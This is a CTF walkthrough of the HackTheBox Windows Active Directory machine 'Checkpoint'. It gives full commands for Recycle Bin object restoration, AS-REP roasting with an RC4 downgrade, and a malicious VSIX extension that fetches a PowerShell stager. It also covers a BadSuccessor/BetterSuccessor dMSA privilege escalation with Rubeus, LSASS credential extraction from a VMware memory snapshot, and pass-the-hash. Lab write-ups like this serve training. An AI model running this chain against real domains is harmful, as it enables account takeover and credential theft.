---
title: HackTheBox - Checkpoint
date: 2026-10-27
image: cover.png
tags: [HackTheBox, Medium, Windows, Active Directory]
platform: HackTheBox
os: Windows
difficulty: Medium
points: 65
released: 2022-06-13
ip: 10.129.23.144
boxAvatar: htb-cover.png
excerpt: A Windows Active Directory box that starts from a set of valid domain credentials. Abusing self-write rights on a deleted coworker's account restores it from the Recycle Bin, which opens the door to AS-REP roasting and write access to a VS Code extensions share. A malicious VSIX package lands a second shell, from where a GenericWrite edge over a service account is weaponized into a dMSA via the BadSuccessor/BetterSuccessor technique. The forged ticket exposes a VMware snapshot of a retired server, whose memory dump yields a reused local Administrator hash for the finishing pass-the-hash.
---

# Checkpoint

Checkpoint is a medium-rated Windows Active Directory machine that hands out a foothold credential up front and asks you to turn it into something useful. The path runs through an ACL quirk on the AD Recycle Bin, an AS-REP roast against a restored account, a write-access share holding approved VS Code extensions, and a GenericWrite edge that is weaponized into a delegated Managed Service Account to borrow another identity's privileges. A VMware snapshot of a decommissioned server, forgotten on a backup share, supplies the credential that finishes the box. Every credential, hash, and IP below belongs to the lab and has no meaning outside of it.

### NMAP Scanning

```powershell
Open 10.129.22.80:53
Open 10.129.22.80:88
Open 10.129.22.80:135
Open 10.129.22.80:139
Open 10.129.22.80:389
Open 10.129.22.80:445
Open 10.129.22.80:464
Open 10.129.22.80:593
Open 10.129.22.80:636
Open 10.129.22.80:3268
Open 10.129.22.80:3269
Open 10.129.22.80:5985
Open 10.129.22.80:9389
```

A standard domain controller port set - DNS, Kerberos, LDAP/LDAPS, SMB, RDP is absent, and WinRM is open. The box resets between sessions, so the IP moves between `10.129.22.80` and `10.129.23.144` in the commands below; both refer to the same host, `DC01.checkpoint.htb`.

We start with a set of valid domain credentials for `alex.turner`.

### Domain Enumeration - SOAPHound

→ Command: `soaphound --domain checkpoint.htb --username 'alex.turner' --password 'Checkpoint2024!' -dc-ip 10.129.22.80 --domain-controller DC01.checkpoint.htb`

{% image %}

### SMB Enumeration - Shares and Version

→ Command: `poetry run NetExec smb DC01.checkpoint.htb -u 'alex.turner' -p 'Checkpoint2024!' --shares`

```powershell
➜  NetExec git:(main) poetry run NetExec smb DC01.checkpoint.htb -u 'alex.turner' -p 'Checkpoint2024!' --shares
SMB         10.129.23.144   445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:checkpoint.htb) (signing:True) (SMBv1:None)
SMB         10.129.23.144   445    DC01             [+] checkpoint.htb\alex.turner:Checkpoint2024!
SMB         10.129.23.144   445    DC01             [*] Enumerated shares
SMB         10.129.23.144   445    DC01             Share           Permissions            Remark
SMB         10.129.23.144   445    DC01             -----           -----------            ------
SMB         10.129.23.144   445    DC01             ADMIN$                                 Remote Admin
SMB         10.129.23.144   445    DC01             C$                                     Default share
SMB         10.129.23.144   445    DC01             DevDrop         READ                   VS Code extensions share for approved .vsix packages compatible with VS Code engine 1.118.0
SMB         10.129.23.144   445    DC01             IPC$            READ                   Remote IPC
SMB         10.129.23.144   445    DC01             NETLOGON        READ                   Logon server share
SMB         10.129.23.144   445    DC01             SYSVOL          READ                   Logon server share
SMB         10.129.23.144   445    DC01             VMBackups
```

Two shares stand out: `DevDrop`, described as a VS Code extensions share for approved `.vsix` packages, and `VMBackups`, which by name alone might hold VM backups worth extracting `NTDS.dit`, `SAM`, and `SYSTEM` from. Neither is accessible yet with our current rights. The host is also running Windows Server 2025 Build 26100, worth keeping in mind for later.

### Writable Objects Enumeration

→ Command: `bloodyAD --host DC01.checkpoint.htb -d checkpoint.htb -u 'alex.turner' -p 'Checkpoint2024!' get writable --detail`

Most of the output is the long list of attributes every user can write on their own account by default (contact info, certificates, DPAPI roaming keys, and so on) - normal and not actionable on its own:

```powershell
distinguishedName: CN=Alex Turner,OU=Employees,DC=checkpoint,DC=htb
thumbnailPhoto: WRITE
pager: WRITE
mobile: WRITE
homePhone: WRITE
userSMIMECertificate: WRITE
msDS-ExternalDirectoryObjectId: WRITE
msDS-AllowedToActOnBehalfOfOtherIdentity: WRITE
msPKICredentialRoamingTokens: WRITE
msPKIDPAPIMasterKeys: WRITE
[ ... self-write attributes trimmed for readability ... ]
```

### Enumerating LDAP Container Objects

→ Command: `bloodyAD --host DC01.checkpoint.htb -d checkpoint.htb -u 'alex.turner' -p 'Checkpoint2024!' get search --base "DC=checkpoint,DC=htb" --filter "(objectClass=container)" --attr dn`

{% image2 %}

A standard set of containers, nothing unusual - but it confirms the domain's base structure before we go looking for something less standard.

### Enumerating the Recycle Bin Feature

→ Command: `bloodyAD --host DC01.checkpoint.htb -d checkpoint.htb -u 'alex.turner' -p 'Checkpoint2024!' get search --base "CN=Partitions,CN=Configuration,DC=checkpoint,DC=htb" --filter "(objectClass=*)" --attr msDS-EnabledFeature`

This checks whether the Recycle Bin feature is enabled at all:

{% image3 %}

It is - which means deleted objects are retained (not just tombstoned) and can potentially be restored.

### Listing and Restoring AD Recycle Bin Objects

→ Command: `bloodyAD --host DC01.checkpoint.htb -d checkpoint.htb -u 'alex.turner' -p 'Checkpoint2024!' get search --base "DC=checkpoint,DC=htb" --filter "(isDeleted=TRUE)" --attr dn,lastKnownParent,msDS-LastKnownRDN,whenChanged -c 1.2.840.113556.1.4.2064 -c 1.2.840.113556.1.4.2065`

{% image4 %}

A deleted user, `Mark Davies`, shows up among the deleted objects. We can confirm the same thing with PowerView:

→ Command: `Get-ADObject -LDAPFilter "(isDeleted=TRUE)" -IncludeDeleted`

{% image5 %}

Restoring it directly doesn't work:

→ Command: `Restore-ADObject -Identity "2217e877-e2a2-47d7-91d4-99ede36f367e"`

{% image6 %}

So we check whether `alex.turner` actually holds the `Reanimate-Tombstones` right over the domain:

→ Command: `Get-DomainObjectAcl -Identity "DC=checkpoint,DC=htb" -ResolveGUIDs -Where "ObjectAceType contains Reanimate"`

{% image7 %}

It does - `alex.turner` is explicitly granted `Reanimate-Tombstones` with `ACCESS_ALLOWED_OBJECT_ACE` on the domain root. A further check on the object itself confirms it is still marked deleted:

→ Command: `Get-ADObject -LDAPFilter "(objectGUID=2217e877-e2a2-47d7-91d4-99ede36f367e)" -IncludeDeleted -Properties isDeleted,distinguishedName`

{% image8 %}

With the right confirmed, the earlier `Restore-ADObject` attempt should have worked in principle, but plain LDAP against this DC needs a specific binding window. We authenticate with Kerberos and reissue the restore as a raw LDAP modify, clearing the `isDeleted` attribute and rewriting the distinguished name back under `OU=Employees`:

```powershell
➜  checkpoint export KRB5CCNAME=alex.turner.ccache
sudo faketime '2026-06-15 21:24:19' ldapmodify -H ldap://DC01.checkpoint.htb \
  -Y GSSAPI \
  -e '!1.2.840.113556.1.4.2064' \
  -e '!1.2.840.113556.1.4.2065' \
  -f restore_mark.ldif
SASL/GSSAPI authentication started
SASL username: alex.turner@CHECKPOINT.HTB
SASL SSF: 256
SASL data security layer installed.
modifying entry "CN=Mark Davies\0ADEL:2217e877-e2a2-47d7-91d4-99ede36f367e,CN=Deleted Objects,DC=checkpoint,DC=htb"

➜  checkpoint cat restore_mark.ldif
dn: CN=Mark Davies\0ADEL:2217e877-e2a2-47d7-91d4-99ede36f367e,CN=Deleted Objects,DC=checkpoint,DC=htb
changetype: modify
delete: isDeleted
-
replace: distinguishedName
distinguishedName: CN=Mark Davies,OU=Employees,DC=checkpoint,DC=htb
```

The same restore is available as a single `bloodyAD` call, which is the simpler path if you don't need the raw LDIF:

```bash
bloodyad --host dc01.checkpoint.htb -d checkpoint.htb -u alex.turner -p 'Checkpoint2024!' set restore 'mark.davies'
```

Checking writable objects again now shows `mark.davies` as a live, writable account:

```powershell
➜  NetExec git:(main) bloodyAD --host DC01.checkpoint.htb -d checkpoint.htb -u 'alex.turner' -p 'Checkpoint2024!' get writable

distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=checkpoint,DC=htb
permission: WRITE

distinguishedName: OU=Employees,DC=checkpoint,DC=htb
permission: CREATE_CHILD

distinguishedName: CN=Alex Turner,OU=Employees,DC=checkpoint,DC=htb
permission: WRITE

distinguishedName: CN=Mark Davies,OU=Employees,DC=checkpoint,DC=htb
permission: WRITE
```

### Kerberoasting and AS-REP Roasting mark.davies

Write access over `mark.davies` means we can set a fake SPN and kerberoast the account:

```powershell
bloodyAD --host DC01.checkpoint.htb -d checkpoint.htb -u 'alex.turner' -p 'Checkpoint2024!' set object mark.davies servicePrincipalName -v 'HTTP/fake.checkpoint.htb'
```

{% image9 %}

→ Verifying the SPN was set: `bloodyAD --host DC01.checkpoint.htb -d checkpoint.htb -u 'alex.turner' -p 'Checkpoint2024!' get object mark.davies --attr servicePrincipalName`

{% image10 %}

Kerberoasting doesn't yield a crackable result, so we pivot to AS-REP roasting instead. First the `DONT_REQUIRE_PREAUTH` UAC flag needs to be set:

```powershell
bloodyAD --host DC01.checkpoint.htb -d checkpoint.htb -u 'alex.turner' -p 'Checkpoint2024!' set object mark.davies userAccountControl -v 4194304
```

That value (`4194304`) disables Kerberos pre-authentication for the account, which lets us request and capture its AS-REP hash without knowing its password:

{% image11 %}

The hash comes back as AES256 (`$krb5asrep$18$`), which cracks far slower than RC4. To get the faster hash instead, we downgrade the account's supported encryption types to RC4 and request the AS-REP again:

→ `bloodyAD --host DC01.checkpoint.htb -d checkpoint.htb -u 'alex.turner' -p 'Checkpoint2024!' set object mark.davies msDS-SupportedEncryptionTypes -v 4`

{% image12 %}

This time the hash is `$krb5asrep$23$` (RC4), and it cracks quickly - to the same password as our starting user, `Checkpoint2024!`. Re-checking the shares with `mark.davies`'s credentials shows write access to `DevDrop` that wasn't there before:

{% image13 %}

### Initial Access via a Malicious VSIX Package

`DevDrop` accepts `.vsix` packages that match VS Code engine `1.118.0`. I used a small tool of mine, `vsix-generator`, to build a package whose activation script downloads and runs a PowerShell stager via `certutil`, matching the engine version the share expects:

{% image14 %}

Uploading the package to the share and waiting for the extension to be picked up and activated gets us a callback as `ryan.brooks`:

{% image15 %}

### Privilege Escalation via dMSA (BadSuccessor / BetterSuccessor)

Further enumeration turns up an OU called `DMSAHolder`, where our current user can create child objects, and a service account, `svc_deploy`, over which `ryan.brooks` holds `GenericWrite`:

{% image16 %}

```bash
PS C:\> $acl2 = Get-Acl "AD:\CN=svc_deploy,OU=ServiceAccounts,DC=checkpoint,DC=htb"
PS C:\> $acl2.Access | Where-Object {$_.IdentityReference -like "*ryan*"} | Select IdentityReference,ActiveDirectoryRights

IdentityReference       ActiveDirectoryRights
-----------------       ---------------------
CHECKPOINT\ryan.brooks  GenericWrite
```

Together, `CreateChild` over an OU and `GenericWrite` over an existing account are exactly the prerequisites for **BadSuccessor**.

Windows Server 2025 introduced delegated Managed Service Accounts (dMSAs), a replacement for legacy service accounts meant to make migrations painless. When a dMSA supersedes an older account, the KDC is expected to carry the predecessor's identity into tickets issued for the dMSA so that dependent services keep working during the transition. The original BadSuccessor research showed that anyone able to create a dMSA could point its `msDS-ManagedAccountPrecededByLink` attribute at an arbitrary privileged account and receive a ticket carrying that account's privileges, with no interaction from the target at all.

Microsoft addressed this in August 2025 by making the KDC validate the migration in both directions: from build 26100.4946 onward, the dMSA's `msDS-ManagedAccountPrecededByLink` has to be matched by the predecessor's own `msDS-SupersededManagedAccountLink` pointing back. Since an attacker previously had no rights over the target account, this was expected to close the attack.

**BetterSuccessor** is the post-patch variant: the KDC only checks that the pairing exists, not who created it. If the attacker already holds write access over the predecessor account - which is exactly what `GenericWrite` over `svc_deploy` gives us here - they can set the reverse link themselves and satisfy the check anyway.

`SharpSuccessor` automates the forward half of the pairing (creating the dMSA and pointing it at the predecessor), and `Rubeus` handles the ticket requests. Both binaries are uploaded to `C:\temp` through the existing shell:

```powershell
C:\temp> .\SharpSuccessor.exe add /impersonate:svc_deploy /path:"OU=DMSAHolder,DC=checkpoint,DC=htb" /account:ryan.brooks /name:svc_backup

[+] Adding dnshostname svc_backup.checkpoint.htb
[+] Adding samaccountname svc_backup$
[+] svc_deploy's DN identified
[+] Attempting to write msDS-ManagedAccountPrecededByLink
[+] Wrote attribute successfully
[+] Attempting to write msDS-DelegatedMSAState attribute
[+] Attempting to set access rights on the dMSA object
[+] Attempting to write msDS-SupportedEncryptionTypes attribute
[+] Attempting to write userAccountControl attribute
[+] Created dMSA object 'CN=svc_backup' in 'OU=DMSAHolder,DC=checkpoint,DC=htb'
[+] Successfully weaponized dMSA object
```

The dMSA now points at `svc_deploy` via `msDS-ManagedAccountPrecededByLink`, but on this build that's only half of what the patched KDC requires - the reverse link on `svc_deploy` also has to be set. The common PowerShell paths for writing it (`Set-ADObject`, and `System.DirectoryServices` via `.Invoke('Put', ...)`) report success without the values actually sticking for these two attributes. A raw `System.DirectoryServices.Protocols` modify request is the reliable way to set them, since it returns the real server result code instead of silently no-op'ing:

```powershell
PS C:\> Add-Type -AssemblyName "System.DirectoryServices.Protocols"
PS C:\> $ldap = New-Object System.DirectoryServices.Protocols.LdapConnection("DC01.checkpoint.htb")
PS C:\> $ldap.AuthType = "Negotiate"; $ldap.Bind()
PS C:\> $dmsa = "CN=svc_backup,OU=DMSAHolder,DC=checkpoint,DC=htb"
PS C:\> $target = "CN=svc_deploy,OU=ServiceAccounts,DC=checkpoint,DC=htb"
PS C:\> $mod = New-Object System.DirectoryServices.Protocols.ModifyRequest
PS C:\> $mod.DistinguishedName = $target
PS C:\> $m1 = New-Object System.DirectoryServices.Protocols.DirectoryAttributeModification
PS C:\> $m1.Name = "msDS-SupersededManagedAccountLink"; $m1.Operation = "Replace"; $null = $m1.Add($dmsa)
PS C:\> $m2 = New-Object System.DirectoryServices.Protocols.DirectoryAttributeModification
PS C:\> $m2.Name = "msDS-SupersededServiceAccountState"; $m2.Operation = "Replace"; $null = $m2.Add("2")
PS C:\> $null = $mod.Modifications.Add($m1); $null = $mod.Modifications.Add($m2)
PS C:\> $ldap.SendRequest($mod).ResultCode

Success
```

With both attributes written, the pairing is mutual and the KDC treats the succession as legitimate.

Requesting the dMSA's ticket requires a TGT for `ryan.brooks`, the account allowed to retrieve its credentials. Rather than needing the account's password, `tgtdeleg` abuses the Kerberos GSS-API delegation mechanism to get the local LSA to hand out a usable TGT for the current session:

```powershell
C:\temp> .\Rubeus.exe tgtdeleg /nowrap

[*] Action: Request Fake Delegation TGT (current user)
[*] Found the following tickets:
[*] Obtained a TGT for the current user
[*] base64(ticket.kirbi):

doIFuj...<SNIP>...Q0hFQ0tQT0lOVC5IVEI=
```

With that TGT in hand, we request a service ticket for the dMSA. The `/dmsa` flag tells Rubeus to pull the predecessor's key material alongside the ticket, and `/opsec` keeps the request shaped like a normal one:

```powershell
C:\temp> .\Rubeus.exe asktgs /targetuser:svc_backup$ /service:krbtgt/CHECKPOINT.HTB /opsec /dmsa /nowrap /ticket:<ryan_brooks_TGT>

[+] TGS request successful!

[*] base64(ticket.kirbi):

doIF3DCCBdigAwIBBaEDAgEWooIE2DCCBNRhggTQMIIEzK...<SNIP>...kFEQ0tQT0lOVC5IVEI=

ServiceName   : krbtgt/CHECKPOINT.HTB
ServiceRealm  : CHECKPOINT.HTB
UserName      : svc_backup$ (NT_PRINCIPAL)
UserRealm     : checkpoint.htb
StartTime     : 10/20/2026 7:56:07 AM
EndTime       : 10/20/2026 8:11:07 AM
RenewTill     : 10/27/2026 7:55:50 AM
Flags         : name_canonicalize, pre_authent, renewable, forwarded, forwardable
KeyType       : aes256_cts_hmac_sha1
Base64(key)   : pn8fK+Nm+Rl2sh98Pvft6JmNiviPqE0fjAdWoI3hxNU=
Current Keys for svc_backup$: (aes256_cts_hmac_sha1)
AB8A02CFA625C5971D39A8AFBF161F92F76AC41ACDEEC9A7B1B5B050403D6366
```

The ticket is issued to `svc_backup$`, but because the KDC believes that account supersedes `svc_deploy`, its PAC also carries `svc_deploy`'s group memberships - any service authorizing against that PAC treats us as `svc_deploy`. The dMSA's TGT only lives for 15 minutes by default, so a later `KRB_AP_ERR_TKT_EXPIRED` just means re-running `asktgs` against the still-valid `ryan.brooks` TGT for a fresh one.

The ticket is easier to work with locally, so we decode the base64 blob into a `.kirbi` file and convert it with Impacket into the `.ccache` format Evil-WinRM expects. `impacket-ticketConverter` wants the raw binary KRB-CRED structure, not the base64 text, so piping through `base64 -d` is essential:

```bash
$ echo 'doIF3DCCBdigAwIBBaEDAgEW...<SNIP>...kFEQ0tQT0lOVC5IVEI=' | base64 -d > svc_backup.kirbi

$ impacket-ticketConverter svc_backup.kirbi svc_backup.ccache
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies
[*] converting kirbi to ccache...
[+] done

$ export KRB5CCNAME=$(pwd)/svc_backup.ccache
```

We can now open a WinRM session with the ticket. The target has to be addressed by its fully qualified name, `DC01.checkpoint.htb`, so the correct SPN gets requested:

```bash
$ evil-winrm -i DC01.checkpoint.htb -r CHECKPOINT.HTB

*Evil-WinRM* PS C:\Users\svc_backup$\Documents> whoami

checkpoint\svc_backup$
```

### Privilege Escalation via a VMware Memory Dump

The `VMBackups` share was visible but inaccessible from the very start, and `svc_deploy` is exactly the kind of account that would plausibly reach it. From the new shell we can read it directly on disk:

```bash
*Evil-WinRM* PS C:\> ls "C:\Shares\VMBackups\NightlyBackup_2024-11-01\memory forensics\"

    Directory: C:\Shares\VMBackups\NightlyBackup_2024-11-01\memory forensics

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a---          5/13/2026  19:28      106496000 Windows Server 2019-000001.vmdk
-a---          5/13/2026  19:28     2147483648 Windows Server 2019-Snapshot1.vmem
-a---          5/15/2026  04:02      138164859 Windows Server 2019-Snapshot1.vmsn
-a---          5/13/2026  19:28         270840 Windows Server 2019.nvram
-a---          5/13/2026  19:28           7642 Windows Server 2019.scoreboard
-a---          5/13/2026  19:28    10199695360 Windows Server 2019.vmdk
-a---          5/13/2026  19:28            502 Windows Server 2019.vmsd
-a---          5/13/2026  19:28           2749 Windows Server 2019.vmx
-a---          5/13/2026  19:28            274 Windows Server 2019.vmxf
```

This is a VMware snapshot of a decommissioned Windows Server 2019 host. The `.vmdk` disks aren't especially interesting, but the snapshot pair is: when a snapshot is taken of a running VM, the hypervisor writes the guest's entire physical memory to the `.vmem` file and records the matching device state in `.vmsn`. That's a full offline copy of RAM from a running Windows server, including whatever LSASS was holding at the time. None of the usual protections on a live system - PPL, Credential Guard - apply here, because nothing is asking the OS for permission; we're just reading a file.

`vmkatz` parses this pair and applies the same credential-extraction logic Mimikatz uses against a live LSASS process. We upload the binary through the existing WinRM session and point it at the `.vmsn` file, which tells it how to map the accompanying memory image:

```bash
*Evil-WinRM* PS C:\Windows\Temp\vmk> upload vmkatz.exe
*Evil-WinRM* PS C:\Windows\Temp\vmk> .\vmkatz.exe 'C:\Shares\VMBackups\NightlyBackup_2024-11-01\memory forensics\Windows Server 2019-Snapshot1.vmsn'

[*] vmkatz v1.5.1
[*] System discovery: 17.23s
[*] Credential extraction: 1.62s
[*] 2 sessions, 1 NT hashes, 0 plaintext passwords
[+] SAM Hashes:
RID: 500  Administrator        NT:f29e9c014295b9b32139b09a2790be3b
RID: 501  Guest                NT:00000000000000000000000000000000 (DISABLED, NO PASSWORD)
RID: 503  DefaultAccount       NT:00000000000000000000000000000000 (DISABLED, NO PASSWORD)
RID: 504  WDAGUtilityAccount   NT:28f8d934dee90b2ec824351cb0844479 (DISABLED)
[+] LSA Secrets:
DPAPI_SYSTEM
  user_key: 914b2bd39adf134401ec6eceb08f8ec131d2ecbd
  machine_key: 77d90ebac2487f870a26e4776c72b4509b06dd1b
NL$KM
  key: 0e421c8e384f72e38169dd54e29255fa6c319978314c9e6a7fb9f...<SNIP>
```

The recovered hash belongs to the local Administrator of a server that was retired and isn't part of the domain anymore - on paper, useless against the Domain Controller. In practice, build images and administrative accounts get reused across a network far more often than they should, and the credential-reuse pattern already seen on this box suggests the same here. Since NTLM authentication only needs the NT hash, we test the theory directly:

```bash
$ netexec smb checkpoint.htb -u Administrator -H f29e9c014295b9b32139b09a2790be3b

SMB   10.129.85.252   445    DC01    [+] checkpoint.htb\Administrator:f29e9c014295b9b32139b09a2790be3b (Pwn3d!)
```

The reused hash authenticates as the domain Administrator over SMB, completing the box.

Checkpoint strings together a run of AD mechanics that rarely show up together: Recycle Bin reanimation gated behind a dedicated ACE, a forced downgrade from AES to RC4 to make AS-REP roasting practical, a write-access share as an initial-access vector, and BadSuccessor's post-patch variant abusing a two-sided trust check that only verifies the pairing exists rather than who created it. The VMware memory dump at the end is a reminder that decommissioned infrastructure rarely gets scrubbed as carefully as it should, and that a single reused local Administrator hash can undo everything else a network got right.
